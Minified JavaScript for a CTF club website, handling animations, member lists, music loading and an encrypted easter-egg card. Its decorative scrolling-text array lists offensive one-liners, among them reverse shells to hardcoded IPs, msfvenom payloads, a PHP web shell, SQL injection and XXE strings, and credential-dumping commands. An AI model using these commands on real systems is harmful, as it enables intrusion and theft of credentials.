var TKCTF=(()=>{var _=(t,e,o)=>new Promise((n,i)=>{var s=a=>{try{c(o.next(a))}catch(l){i(l)}},r=a=>{try{c(o.throw(a))}catch(l){i(l)}},c=a=>a.done?n(a.value):Promise.resolve(a.value).then(s,r);c((o=o.apply(t,e)).next())});var k="medium",g=!1,$=0;function We(t){k!==t&&(k=t,document.querySelectorAll(".performance-btn").forEach(e=>{e.classList.remove("active")}),document.querySelector(`[data-level="${t}"]`).classList.add("active"),localStorage.setItem("tkctf-performance-level",t),Ge())}function Ge(){let t=document.getElementById("dataStreams");t&&(t.innerHTML="",Se()),pe();let e=v();[".content-section",".president-item",".president-members",".role-tag",".code-name"].forEach(n=>{document.querySelectorAll(n).forEach(s=>{s.classList.remove("fade-in-visible"),!e.enableFadeAnimations&&(n===".role-tag"||n===".code-name")?(s.style.opacity="1",s.style.transform="translateY(0)",s.style.transition="none"):(s.style.opacity="0",s.style.transform="translateY(30px)",s.style.transition="opacity 0.6s ease, transform 0.6s ease")})}),setTimeout(()=>{fe()},100)}function Ye(){let t=document.getElementById("performanceToggle"),e=document.querySelector(".collapse-icon");if(!R){let o=t.offsetHeight;o>0&&(ie=o)}R=!R,R?(t.classList.add("collapsed"),e.textContent="<",ie>0&&(t.style.height=ie+"px")):(t.classList.remove("collapsed"),e.textContent=">",t.style.height=""),localStorage.setItem("tkctf-performance-toggle-collapsed",R),$e()}function $e(){Q()}function Q(){let t=document.querySelector("nav"),e=document.getElementById("performanceToggle");if(!t||!e)return;let o=t.getBoundingClientRect(),n=e.getBoundingClientRect(),s=window.innerWidth>=768?20:10;if(o.top<=25){let c=s+n.height,a=o.top,l=c>=a,d=!(o.right<n.left||o.left>n.right);if(l&&d){if(!N){let f=a+o.height+10;e.style.top=f+"px",N=!0}}else N&&(e.style.top=s+"px",N=!1)}else N&&(e.style.top=s+"px",N=!1)}function v(){return{low:{dataStreamCount:g?4:12,binaryStreamCount:g?Math.floor(1.6):8,spectrumBarCount:Math.floor(g?window.innerWidth/24:window.innerWidth/12),spectrumBarWidth:g?16:8,enableBinaryDigits:!1,enableSpectrumHighlight:!1,enableDataStreamGlitch:!1,enableLogoBeats:!1,enableFadeAnimations:!1,particleCount:g?12:18,dataStreamDrift:g?30:100,typewriterWaitTime:4500},medium:{dataStreamCount:g?8:16,binaryStreamCount:g?Math.floor(4):8,spectrumBarCount:Math.floor(g?window.innerWidth/24:window.innerWidth/12),spectrumBarWidth:g?16:8,enableBinaryDigits:!0,enableSpectrumHighlight:!0,enableDataStreamGlitch:!0,enableLogoBeats:!0,enableFadeAnimations:!0,particleCount:g?15:20,dataStreamDrift:g?50:100,typewriterWaitTime:3500},high:{dataStreamCount:g?12:20,binaryStreamCount:8,spectrumBarCount:Math.floor(g?window.innerWidth/18:window.innerWidth/12),spectrumBarWidth:g?12:8,enableBinaryDigits:!0,enableSpectrumHighlight:!0,enableDataStreamGlitch:!0,enableLogoBeats:!0,enableFadeAnimations:!0,particleCount:g?18:20,dataStreamDrift:100,typewriterWaitTime:2500}}[k]}function Se(){let t=document.getElementById("dataStreams"),e=v(),o=e.dataStreamCount,n=["0x4D5A90000300000004000000FFFF0000B800000000000000400000","GET /api/security HTTP/1.1",`POST /login HTTP/1.1
Content-Type: application/json`,`Connection: keep-alive
Authorization: Bearer eyJ0eXAi`,"SELECT * FROM users WHERE id = ?","UNION SELECT username,password FROM admin","INSERT INTO logs (timestamp, event) VALUES","nmap -sS -O target.com","hydra -l admin -P passwords.txt ssh://target","john --wordlist=rockyou.txt hash.txt",'sqlmap -u "http://target.com/login.php"',"python3 exploit.py --target 192.168.1.100","V2hlbiBkZXN0aW55IGJlZ2lucyB0byByZXNvbmF0ZShCR00pLCB0aGUgYW5zd2VyIGxpZXMgaW4gdGhlIGFieXNzKEZvb3RlciksIHdhaXRpbmcgZm9yIHlvdSB0byBkaXNjb3ZlciBpdC4=","use exploit/multi/handler","set PAYLOAD windows/x64/meterpreter/reverse_tcp","msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.0.87 LPORT=4444 -f elf -o reverse.elf","ncat.exe%20112.34.55.67%204444%20-e%20cmd","/bin/bash -i >& /dev/tcp/112.34.55.67/4444 0>&1","nc -lvnp 4444",'msfconsole -q -x "use exploit/multi/handler"','curl -X POST -d "username=admin&password=123"','wireshark -i eth0 -f "tcp port 80"',"tcpdump -i any -w capture.pcap","openssl s_client -connect target.com:443","ssh-keygen -t rsa -b 4096","gpg --gen-key --default-new-key-algo rsa4096","hashcat -a 0 -m 1000 hashes.txt wordlist.txt","aircrack-ng -w wordlist.txt capture.cap","dirb http://target.com/ /usr/share/wordlists/","gobuster dir -u http://target.com -w wordlist.txt",'<script>alert("XSS")<\/script>',"../../../../etc/passwd","{{7*7}}[[7*7]]",'<?php system($_GET["cmd"]); ?>','eval(base64_decode("c3lzdGVtKCRfR0VUWyJjbWQiXSk7"))',"LDAP injection: *)(&(objectClass=*)",'XXE: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>',"' OR '1'='1' --","'; DROP TABLE users; --","' UNION SELECT NULL,username,password FROM admin --","1' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --","masscan -p1-65535 --rate=1000 192.168.1.0/24","nmap -sV -sC -A target.com","nmap --script vuln target.com","nikto -h http://target.com","whatweb http://target.com","fierce -dns target.com","dnsrecon -d target.com -t brt","sublist3r -d target.com","medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh","patator ssh_login host=192.168.1.100 user=admin password=FILE0 0=passwords.txt","crackmapexec smb 192.168.1.0/24 -u admin -p password123","wpscan --url http://target.com --enumerate u,p","use auxiliary/scanner/smb/smb_version","use exploit/windows/smb/ms17_010_eternalblue","set RHOSTS 192.168.1.100","exploit -j","search cve:2021-44228","use post/windows/gather/hashdump","msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.0.87 LPORT=443 -f exe -o payload.exe","msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.0.87 LPORT=4444 -f raw > shell.php","msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.0.87 LPORT=4444 -f war > shell.war",`python -c "import socket,subprocess,os;s=socket.socket();s.connect(('10.10.0.87',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"`,`php -r "$sock=fsockopen('10.10.0.87',4444);exec('/bin/sh -i <&3 >&3 2>&3');"`,`ruby -rsocket -e"f=TCPSocket.open('10.10.0.87',4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)"`,`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.0.87',4444);"`,"ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//","arpspoof -i eth0 -t 192.168.1.100 192.168.1.1","responder -I eth0 -rdw","mitmdump -s script.py","hashcat -a 3 -m 1000 hashes.txt ?a?a?a?a?a?a","john --format=NT hashes.txt","ophcrack -t tables/ -f hashes.txt","fcrackzip -D -p rockyou.txt archive.zip","airodump-ng wlan0mon","aireplay-ng -0 10 -a 00:11:22:33:44:55 wlan0mon","aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 capture.cap","wifite --kill","kismet -c wlan0","ffuf -w wordlist.txt -u http://target.com/FUZZ","dirsearch -u http://target.com -e php,html,js","feroxbuster -u http://target.com -w wordlist.txt","wfuzz -w wordlist.txt http://target.com/FUZZ",'sqlmap -u "http://target.com/page.php?id=1" --dbs','sqlmap -u "http://target.com/page.php?id=1" --dump-all','sqlmap -u "http://target.com/page.php?id=1" --os-shell',"NoSQLMap -t mongodb://target.com:27017","setoolkit","gophish server --listen 0.0.0.0:3333","beef-xss","shellphish","mimikatz # sekurlsa::logonpasswords","bloodhound-python -d domain.local -u user -p pass -gc dc.domain.local -c all","winpeas.exe","linpeas.sh","privilege escalation: sudo -l","find / -perm -u=s -type f 2>/dev/null",'tshark -i eth0 -f "tcp port 80" -w capture.pcap',"tcpflow -i eth0 -c","dsniff -i eth0","urlsnarf -i eth0","volatility -f memory.dump imageinfo","autopsy case.db",'grep -r "error" /var/log/',"logstash -f config.conf","steghide embed -cf image.jpg -ef secret.txt","binwalk -e firmware.bin","strings binary | grep -i password","hexdump -C file.bin | head -20","burpsuite --config-file=config.json","postman collection run security-tests.json","owasp-zap-cli quick-scan --self-contained http://target.com",'curl -X GET "http://target.com/api/users" -H "Authorization: Bearer token123"'];for(let i=0;i<o;i++){let s=document.createElement("div");s.className="data-stream";let r=n[Math.floor(Math.random()*n.length)];s.textContent=r,s.setAttribute("data-text",r);let c=Math.random()*window.innerWidth,a=(Math.random()-.5)*e.dataStreamDrift,l=Math.random()*8;s.style.left=c+"px",s.style.setProperty("--drift-x",a+"px"),s.style.animationDelay=`-${l}s`,t.appendChild(s)}je()}function je(){let t=document.getElementById("dataStreams"),o=v().binaryStreamCount;for(let n=0;n<o;n++){let i=document.createElement("div");i.className="binary-stream";let s="";for(let a=0;a<80;a++)s+=Math.random()>.5?"1":"0",a%8===7&&(s+=" ");i.textContent=s,i.setAttribute("data-text",s);let r=Math.random()*window.innerHeight,c=Math.random()*20;i.style.top=r+"px",i.style.animationDelay=`-${c}s`,t.appendChild(i)}}function ze(t){let e=document.querySelector(t);if(e){let o=document.querySelector("nav"),n=e.querySelector("h2"),i=o?o.offsetHeight:0,s=n?n.offsetHeight:0,r=i+s,a=e.getBoundingClientRect().top+window.pageYOffset-r;window.scrollTo({top:a,behavior:"smooth"})}}document.querySelectorAll('nav a[href^="#"]').forEach(t=>{t.addEventListener("click",function(e){e.preventDefault(),ze(this.getAttribute("href"))})});function fe(){let t=window.innerHeight,e=t*.7,n=v().enableFadeAnimations?[".president-item",".contact-item","#friendsList",".president-members",".member-row",".role-tag",".code-name"]:[".president-item",".president-members","#friendsList"];document.querySelectorAll(".content-section").forEach((s,r)=>{if(s.classList.contains("fade-in-visible"))return;let c=s.getBoundingClientRect().top,a=s.getBoundingClientRect().height,l=t*.85,d=a*.05;if(c<l-d&&c>-a){let f=r*100;setTimeout(()=>{s.style.opacity="1",s.style.transform="translateY(0)",s.classList.add("fade-in-visible"),s.style.transition="opacity 1.5s ease, transform 1.5s ease"},f)}}),n.forEach(s=>{document.querySelectorAll(s).forEach((c,a)=>{if(c.classList.contains("fade-in-visible"))return;let l=c.getBoundingClientRect().top,d=c.getBoundingClientRect().height,m=d*.05;if(l<t-m&&l>-d){let u=a*50;setTimeout(()=>{c.style.opacity="1",c.style.transform="translateY(0)",c.classList.add("fade-in-visible"),c.id},u)}})})}function Ve(){let t=document.getElementById("backToTop"),e=document.querySelector("footer");if(!t)return;let o=window.pageYOffset||document.documentElement.scrollTop,n=e?e.getBoundingClientRect().top+window.pageYOffset:1/0,i=window.innerHeight,s=window.innerWidth<768,r=s?20:30,c=s?45:50;if(o>200){if(t.classList.add("show"),o+i-c-r+c+10>n){let l=o+i-n+10;t.style.bottom=l+"px"}else t.style.bottom=r+"px";Be(o)}else t.classList.remove("show")}function xe(){let t=document.getElementById("backToTop");if(!t)return;let e=t.querySelector(".progress-ring"),o=t.querySelector(".progress-ring-circle"),n=t.querySelector(".progress-ring-progress");if(!e||!o||!n)return;let i=window.innerWidth<768,r=(i?45:50)*1.2,c=i?21.5:23,a=r/2,l=2*Math.PI*c;e.setAttribute("width",r),e.setAttribute("height",r),o.setAttribute("cx",a),o.setAttribute("cy",a),o.setAttribute("r",c),n.setAttribute("cx",a),n.setAttribute("cy",a),n.setAttribute("r",c),n.setAttribute("transform",`rotate(-90 ${a} ${a})`),n.setAttribute("stroke-dasharray",l),n.style.strokeDashoffset=l}function Be(t){let e=document.getElementById("backToTop");if(!e)return;let o=e.querySelector(".progress-ring-progress");if(!o)return;let n=document.documentElement.scrollHeight,i=window.innerHeight,s=n-i,r=s>0?Math.min(t/s,1):0,a=window.innerWidth<768?21.5:23,l=2*Math.PI*a;o.getAttribute("stroke-dasharray")||o.setAttribute("stroke-dasharray",l);let m=l*(1-r);o.style.strokeDashoffset=m}function _e(){W(),window.scrollTo({top:0,behavior:"smooth"})}function Xe(){return _(this,null,function*(){try{let e=yield(yield fetch("./data/members.json")).json();Ue(e.presidents),Ze(e.members)}catch(t){console.error("\u52A0\u8F7D\u6210\u5458\u6570\u636E\u5931\u8D25:",t)}})}function Ke(){return _(this,null,function*(){try{let e=yield(yield fetch("./data/friends.json")).json();Je(e.friends)}catch(t){console.error("\u52A0\u8F7D\u53CB\u94FE\u6570\u636E\u5931\u8D25:",t)}})}function Ue(t){let e=document.getElementById("presidentsList");if(!e)return;let o=Object.keys(t).sort((n,i)=>n-i);e.innerHTML="",o.forEach((n,i)=>{let s=t[n];if(!s)return;let r=document.createElement("div");r.className="president-item",r.style.opacity="0",r.style.transform="translateY(30px)",r.style.transition="opacity 0.6s ease, transform 0.6s ease",r.style.animationDelay=`${i*300}ms`;let c=document.createElement("div");c.className="president-year",c.textContent=`${n}\u5C4A\u625B\u628A\u5B50`,r.appendChild(c);let a=document.createElement("div");a.className="president-names",r.appendChild(a);let l=document.createElement("div");if(l.className="achievements",l.innerHTML=s.achievements||"\u4E3B\u8981\u6210\u5C31\uFF1A\u6682\u65E0\u8BB0\u5F55",r.appendChild(l),!s.members||s.members.length===0){let d=document.createElement("span");d.className="unknown-member",d.innerHTML='> Error: Permission denied\uFF08\u7EC6\u8282\u6709\u5F85\u8003\u8BC1\uFF09<span class="blinking-cursor">_</span>',a.appendChild(d)}else{let d=document.createElement("div");d.className="president-members",d.style.opacity="0",d.style.transform="translateY(30px)",d.style.transition="opacity 0.6s ease, transform 0.6s ease",s.members.forEach((m,f)=>{let u=document.createElement("div");u.className="member-row",u.style.animationDelay=`${f*.1}s`,u.style.opacity="0",u.style.transform="translateY(30px)",u.style.transition="opacity 0.6s ease, transform 0.6s ease";let w=document.createElement("span");w.className="member-name",w.textContent=m.name,u.appendChild(w),m.roles.forEach(G=>{let L=document.createElement("span"),ne;ee(G)?ne=et(G):ne=V(G),L.className=`role-tag ${ne}`,L.textContent=G,v().enableFadeAnimations?(L.style.opacity="0",L.style.transform="translateY(30px)",L.style.transition="opacity 0.6s ease, transform 0.6s ease"):(L.style.opacity="1",L.style.transform="translateY(0)",L.style.transition="none"),tt(m.roles)&&!ee(G)&&nt(L,m.roles),u.appendChild(L)});let h=document.createElement("span");!m.codeName||m.codeName.trim()===""?(h.className="code-name null",h.textContent="Error: code-name not found"):(h.className="code-name",Qe(h,m.codeName)),v().enableFadeAnimations?(h.style.opacity="0",h.style.transform="translateY(30px)",h.style.transition="opacity 0.6s ease, transform 0.6s ease"):(h.style.opacity="1",h.style.transform="translateY(0)",h.style.transition="none"),u.appendChild(h),d.appendChild(u)}),a.appendChild(d)}e.appendChild(r)})}function Ze(t){let e=document.getElementById("membersList");if(!e)return;let o=Object.keys(t).sort((n,i)=>i-n);e.innerHTML="",o.forEach((n,i)=>{let s=t[n];if(!s)return;let r=document.createElement("div");r.className="member-group";let c=document.createElement("div");c.className="member-year",c.textContent=`${n}\u5C4A`,r.appendChild(c);let a=document.createElement("div");a.className="member-list",s.length===0?a.textContent="\uFF08\u5F85\u8865\u5145\uFF09":a.textContent=s.join("\u3001"),r.appendChild(a),e.appendChild(r)})}function Je(t){let e=document.getElementById("friendsList");if(!e)return;let o=t.map(n=>`<a href="${n.url}" target="_blank">${n.name}</a>`);e.innerHTML=`<p>${o.join("\u3001")}</p>`,e.style.opacity="0",e.style.transform="translateY(30px)",e.style.transition="opacity 0.6s ease, transform 0.6s ease"}function Qe(t,e){let o=e.includes("/")?e.split("/"):[e],n=0,i=!0,s="",c=v().typewriterWaitTime;function a(){let l=o[n].trim();i?s.length<l.length?(s=l.substring(0,s.length+1),t.textContent=s,setTimeout(a,100+Math.random()*100)):setTimeout(()=>{i=!1,a()},c):s.length>0?(s=s.substring(0,s.length-1),t.textContent=s,setTimeout(a,50)):(n=(n+1)%o.length,i=!0,setTimeout(a,200))}a()}function ee(t){let e=t.toLowerCase();return e.includes("\u7814\u53D1\u603B\u76D1")||e.includes("\u793E\u56E2\u65B0\u664B\u6307\u5BFC\u8001\u5E08")}function V(t){let e=t.toLowerCase();return e.includes("\u6280\u672F")||e.includes("\u653B\u9632")?"tech":e.includes("\u884C\u653F\u8FD0\u8425")?"admin":e.includes("\u7ADE\u8D5B")?"competition":e.includes("\u5BA3\u4F20")?"promotion":"default"}function et(t){let e=t.toLowerCase();return e.includes("\u7814\u53D1\u603B\u76D1")?"director":e.includes("\u793E\u56E2\u65B0\u664B\u6307\u5BFC\u8001\u5E08")?"teacher":"default"}function tt(t){let e=t.filter(n=>!ee(n)),o=new Set;return e.forEach(n=>{if(n.includes("/"))n.split("/").forEach(s=>{let r=V(s.trim());o.add(r)});else{let i=V(n);o.add(i)}}),o.size>1}function ot(t){let e={tech:"#4a36ff",admin:"#11ffff",competition:"#ffbe32",promotion:"#ff9ff3",default:"#39b8eb"},o=new Set;return t.filter(i=>!ee(i)).forEach(i=>{if(i.includes("/"))i.split("/").forEach(r=>{let c=V(r.trim());o.add(e[c])});else{let s=V(i);o.add(e[s])}}),Array.from(o)}function nt(t,e){let o=ot(e);if(o.length<=1)return;let n=o.map((i,s)=>{let r=s/(o.length-1)*100;return`${i} ${r}%`}).join(", ");t.style.background=`linear-gradient(135deg, ${n})`,t.style.border="1px solid rgba(255, 255, 255, 0.4)",t.style.boxShadow="0 0 20px rgba(255, 255, 255, 0.5)"}function st(){let t=document.body;window._tkctfScrollTop!==void 0?$=window._tkctfScrollTop:($=window.scrollY||document.documentElement.scrollTop,window._tkctfScrollTop=$),t.style.position!=="fixed"&&(t.style.position="fixed",t.style.top=`-${$}px`,t.style.left="0",t.style.right="0",t.style.width="100%",t.style.overflow="hidden")}function Le(){let t=document.body,e=window._tkctfScrollTop!==void 0?window._tkctfScrollTop:$;t.style.position="",t.style.top="",t.style.left="",t.style.right="",t.style.width="",t.style.overflow="",window.scrollTo(0,e),delete window._tkctfScrollTop}var b={bgm:{loaded:0,total:0,percent:0},fonts:{loaded:0,total:0,percent:0},bgmWeight:.7,fontsWeight:.3};function A(){let t=document.getElementById("progressBar"),e=document.getElementById("progressText"),o=b.bgm.percent*b.bgmWeight+b.fonts.percent*b.fontsWeight;t&&(t.style.width=o+"%"),e&&(e.innerText=Math.floor(o)+"%"),b.bgm.percent>=100&&b.fonts.percent>=100&&setTimeout(()=>{ct()},200)}document.addEventListener("DOMContentLoaded",function(){st(),Ne(),at("./sound/bgm.mp3"),it()});function it(){let t=["./fonts/tkctf.woff2","./fonts/mainfont.woff2","./fonts/textfont.woff2","./fonts/otp.woff2","./fonts/otp-tips.woff2"],e=t.length,o=new Array(e).fill(0),n=0;t.forEach((i,s)=>{let r=new XMLHttpRequest;r.open("GET",i,!0),r.responseType="blob",r.onprogress=function(c){if(c.lengthComputable){o[s]=c.loaded/c.total*100;let a=o.reduce((l,d)=>l+d,0);b.fonts.percent=a/e,A()}},r.onload=function(){if(r.status===200){let c=r.response,a=URL.createObjectURL(c),l=rt(i);if(l&&"fonts"in document){let m=new FontFace(l,`url(${a})`);m.load().then(()=>{document.fonts.add(m)}).catch(f=>{console.warn(`Font ${l} load failed:`,f)})}o[s]=100,n++;let d=o.reduce((m,f)=>m+f,0);b.fonts.percent=d/e,A()}else{console.warn(`Font ${i} load failed, continuing...`),o[s]=100,n++;let c=o.reduce((a,l)=>a+l,0);b.fonts.percent=c/e,A()}},r.onerror=function(){console.warn(`Font ${i} load error, continuing...`),o[s]=100,n++;let c=o.reduce((a,l)=>a+l,0);b.fonts.percent=c/e,A()},r.send()})}function rt(t){let e={"tkctf.woff2":"TKCTF","mainfont.woff2":"MainFont","textfont.woff2":"TextFont","otp.woff2":"OTP","otp-tips.woff2":"OTP-Tips"},o=t.split("/").pop();return e[o]||null}function at(t){let e=new XMLHttpRequest;e.open("GET",t,!0),e.responseType="blob",e.onprogress=function(o){o.lengthComputable&&(b.bgm.percent=o.loaded/o.total*100,A())},e.onload=function(){if(e.status===200){let o=e.response,n=document.getElementById("bgmAudio");n&&(n.src=URL.createObjectURL(o)),b.bgm.percent=100,A()}else console.error("BGM load failed, initializing anyway"),b.bgm.percent=100,A()},e.onerror=function(){console.error("BGM load error, initializing anyway"),b.bgm.percent=100,A()},e.send()}function ct(){let t=document.getElementById("loadingMask"),e=document.getElementById("progressBar"),o=document.getElementById("progressText"),n=document.querySelector(".loading-text"),i=document.querySelector(".loading-content");if(!t){lt();return}i&&(n&&(n.style.animation="none"),i.style.transition="transform 0.7s ease-out, opacity 0.7s ease-out",i.style.transform="scale(1.2)",i.style.opacity="0"),setTimeout(()=>{t.style.display="none",Le(),Ie()},700)}function lt(){let t=document.getElementById("loadingMask");t&&(t.style.display="none"),Le(),Ie()}function Ie(){g=window.innerWidth<768,le=window.pageYOffset||document.documentElement.scrollTop,xe(),Se(),pe();let t=v();[".content-section",".president-item",".president-members",".role-tag",".code-name"].forEach(m=>{document.querySelectorAll(m).forEach(u=>{!t.enableFadeAnimations&&(m===".role-tag"||m===".code-name")?(u.style.opacity="1",u.style.transform="translateY(0)",u.style.transition="none"):(u.style.opacity="0",u.style.transform="translateY(30px)",u.style.transition="opacity 0.6s ease, transform 0.6s ease")})}),fe(),Xe(),Ke();let o=document.querySelector(".about-title");o&&setTimeout(()=>{o.classList.add("loaded")},100);let n=document.getElementById("backToTop");n&&n.addEventListener("click",_e);let i=document.getElementById("logoContainer"),s=document.getElementById("bgmAudio");if(i&&s&&(Z||Ne(),Bt(),i.addEventListener("click",Ft),s.addEventListener("ended",Dt),O("initial"),g)){let m=document.getElementById("logo");m&&(m.style.transform="")}s&&(s.volume=1,s.loop=!0);let c="ontouchstart"in window||navigator.maxTouchPoints>0?20:150,a=localStorage.getItem("tkctf-performance-level");a&&["low","medium","high"].includes(a)&&(k=a,document.querySelectorAll(".performance-btn").forEach(m=>{m.classList.remove("active")}),document.querySelector(`[data-level="${a}"]`).classList.add("active")),document.querySelectorAll(".performance-btn").forEach(m=>{m.addEventListener("click",()=>{let f=m.getAttribute("data-level");We(f)})}),localStorage.getItem("tkctf-performance-toggle-collapsed")==="true"&&(R=!0,document.getElementById("performanceToggle").classList.add("collapsed"),document.querySelector(".collapse-icon").textContent="<");let d=document.getElementById("performanceToggleCollapse");d&&d.addEventListener("click",Ye),setTimeout(()=>{Q()},1e3),setInterval(()=>{Q()},500)}var dt=0;var P=!1,S=0,Me=1,se=!1,te=!1,le=0,Y=0,he=0,R=!1,ie=0,N=!1,ye=0,mt=2e3;function ut(){let t=document.getElementById("mainFooter");if(!t||P)return;let e=document.getElementById("bgmAudio");if(!e||e.paused)return;let o=window.pageYOffset||document.documentElement.scrollTop,n=t.offsetTop,i=window.innerHeight,s=document.documentElement.scrollHeight,r=o+i>=s-1,c=o+i>=n+t.offsetHeight;r&&c&&gt()}function ke(){let t=document.getElementById("mainFooter");if(!t)return!1;let e=window.pageYOffset||document.documentElement.scrollTop,o=t.offsetTop,n=window.innerHeight,i=document.documentElement.scrollHeight;if("ontouchstart"in window||navigator.maxTouchPoints>0){let r=e+n>=i-20,c=e+n>=o-50;return r&&c}else{let r=e+n>=i-1,c=e+n>=o+t.offsetHeight;return r&&c}}function ft(t){let e=document.getElementById("mainFooter");if(!e)return;let o=document.getElementById("bgmAudio");if(!o||o.paused)return;let n=window.pageYOffset||document.documentElement.scrollTop,i=e.offsetTop,s=window.innerHeight,r=document.documentElement.scrollHeight,c=n+s>=r-1,a=n+s>=i+e.offsetHeight;if(c&&a){let l=Date.now();if(t.deltaY>0){if(!P){let d=Math.abs(t.deltaY),m=1+Math.min(2,d/150);Y+=d*m;let f=250,u=3200;if(l-he<f){if(Y>=u){t.preventDefault();let w=Math.min(3,Math.max(1,Math.ceil(Y/1200)));for(let h=0;h<w;h++)Ae(0);Y=0}}else Y=d*m;he=l}}else t.deltaY<0&&(P?(t.preventDefault(),Pe()):S>0&&(t.preventDefault(),W()))}}function pt(t){let e=document.getElementById("particleContainer");if(!e)return;let o=Math.min(5+t*2,30);for(let n=0;n<o;n++){let i=document.createElement("div");i.className="particle",i.style.left=Math.random()*100+"%",i.style.animationDelay=Math.random()*2+"s",i.style.animationDuration=2+Math.random()*2+"s";let s=2+t*.5;i.style.width=s+"px",i.style.height=s+"px";let r=.5+t*.05;i.style.boxShadow=`0 0 ${10+t}px #00e4ff, 0 0 ${20+t*2}px #00e4ff, 0 0 ${30+t*3}px #00e4ff`,e.appendChild(i),setTimeout(()=>{i.parentNode&&i.parentNode.removeChild(i)},3e3)}}function gt(){se||(se=!0,pt(1),setTimeout(()=>{se=!1},100))}function Ae(t){if(!document.getElementById("mainFooter"))return;te&&(S=0,te=!1),S++;let n="ontouchstart"in window||navigator.maxTouchPoints>0?20:150;S>=n?wt():S/n>=.01&&ht()}function W(){let t=document.getElementById("mainFooter");if(!t)return;Me=1,t.style.borderTopWidth="1px",S=0,te=!0,document.querySelectorAll(".persistent-glow").forEach(n=>n.remove());let o=document.getElementById("dataStreams");o&&(o.style.transition="opacity 1s ease-in",o.style.opacity="1")}function ht(){let t=document.getElementById("persistentGlow");if(t){yt(t);return}let e=document.createElement("div");e.id="persistentGlow",e.className="persistent-glow";let o=window.innerWidth<768,i="ontouchstart"in window||navigator.maxTouchPoints>0?20:150,s=Math.min(S/i,1),r=o?15:20,a=r+(135-r)*s,l=o?.4:.6,m=l+(.9-l)*s;if(e.style.cssText=`
        position: fixed;
        bottom: 0;
        left: 0;
        width: 100%;
        height: ${a}px;
        background: linear-gradient(to top, rgba(0, 228, 255, ${m}), transparent);
        z-index: 1000;
        will-change: opacity, transform;
        animation: persistentGlow 2s ease-in-out infinite;
        pointer-events: none;
    `,document.body.appendChild(e),o){let f=document.getElementById("dataStreams");f&&(f.style.transition="opacity 1s ease-out",f.style.opacity="0")}}function yt(t){let e=window.innerWidth<768,n="ontouchstart"in window||navigator.maxTouchPoints>0?20:150,i=Math.min(S/n,1),s=e?15:20,c=s+(135-s)*i,a=e?.4:.6,d=a+(.9-a)*i;t.style.height=`${c}px`,t.style.background=`linear-gradient(to top, rgba(0, 228, 255, ${d}), transparent)`}function wt(){P=!0;let t=document.getElementById("easterEgg"),e=document.getElementById("mainFooter");if(!t)return;e&&(e.style.display="none");let o=document.getElementById("persistentGlow");o&&(o.style.display="none");let n=document.getElementById("dataStreams");n&&(n.style.transition="opacity 1s ease-in",n.style.opacity="1"),vt(),t.classList.add("show"),t.scrollIntoView({behavior:"smooth"}),Rt()}function bt(){let t=["IUAj","S2V5","U2VjcmV0","MjAyNQ==","Q1RG","VEs="],e=Object.assign({},{"!":"A","@":"B","#":"C",T:"D",K:"E",C:"F",F:"G",2:"H",0:"I",5:"J",S:"K",e:"L",c:"M",r:"N",t:"O"},{K:"P",e:"Q",y:"R","!":"S","@":"T"}),o=[];for(let r of t)o.push(atob(r));let n=o.join(""),i={};for(let[r,c]of Object.entries(e))i[c]=r;let s="";for(let r of n)s+=i[r]||r;return s}function we(t){try{let e=bt(),n=CryptoJS.AES.decrypt(t,e).toString(CryptoJS.enc.Utf8);if(!n)throw new Error("\u89E3\u5BC6\u5931\u8D25\u6216\u5BC6\u94A5\u9519\u8BEF");return n}catch(e){throw console.error("\u89E3\u5BC6\u5931\u8D25:",e),e}}var be=0,de="",me="";function vt(){return _(this,null,function*(){let t=document.getElementById("cardContent");if(t)try{let e=yield fetch("./data/Card.encrypted");e.ok&&(de=we(yield e.text()));try{let o=yield fetch("./data/otp.encrypted");o.ok&&(me=we(yield o.text()))}catch(o){console.log("OTP content not available")}t.innerHTML=de,oe()}catch(e){console.error("\u52A0\u8F7D\u6216\u89E3\u5BC6\u5361\u7247\u5185\u5BB9\u5931\u8D25:",e),t.innerHTML='<div class="card-container" id="cardContainer"><div class="card" id="card"><div class="card-front"><img src="./img/TKCTF512.svg" alt="TKCTF Logo" class="card-logo"></div><div class="card-back"><div class="card-content"><h4>\u5173\u4E8E\u672C\u7F51\u7AD9</h4><p>\u5185\u5BB9\u52A0\u8F7D\u5931\u8D25</p></div></div></div></div>',oe()}})}function Pe(){P=!1,dt=0,S=0,Me=1,te=!1;let e="ontouchstart"in window||navigator.maxTouchPoints>0?20:150,o=document.getElementById("easterEgg"),n=document.getElementById("mainFooter");if(!o)return;o.classList.remove("show");let i=document.getElementById("cardContent");i&&(i.innerHTML=""),Oe();let s=document.getElementById("persistentGlow");s&&s.remove();let r=document.getElementById("dataStreams");r&&(r.style.transition="opacity 1s ease-in",r.style.opacity="1"),n&&(n.style.display="",n.style.borderTopWidth="1px"),n&&n.scrollIntoView({behavior:"smooth"})}function oe(){let t=document.getElementById("card");t&&t.addEventListener("click",function(){if(!t.classList.contains("flipped"))if(be++,be%10===0&&me){let o=document.getElementById("cardContent");o.innerHTML=me,oe(),Tt(o),o.offsetWidth;let n=document.getElementById("card");requestAnimationFrame(()=>{n.classList.add("flipped")})}else if(document.getElementById("otp")){let o=document.getElementById("cardContent");o.innerHTML=de,oe(),o.offsetWidth;let n=document.getElementById("card");requestAnimationFrame(()=>{n.classList.add("flipped")})}else t.classList.add("flipped");else t.classList.remove("flipped")})}function Tt(t){t.querySelectorAll("script").forEach(o=>{let n=document.createElement("script");Array.from(o.attributes).forEach(i=>n.setAttribute(i.name,i.value)),n.appendChild(document.createTextNode(o.innerHTML)),o.parentNode.replaceChild(n,o)})}window.addEventListener("scroll",()=>{let t=window.pageYOffset||document.documentElement.scrollTop;t<le-1&&S>0&&W(),le=t,Ve(),fe(),ut(),Et()});function Et(){if(!document.getElementById("mainFooter")||P)return;let e=document.getElementById("bgmAudio");!e||e.paused||ke()&&Nt()}window.addEventListener("wheel",ft,{passive:!1});var 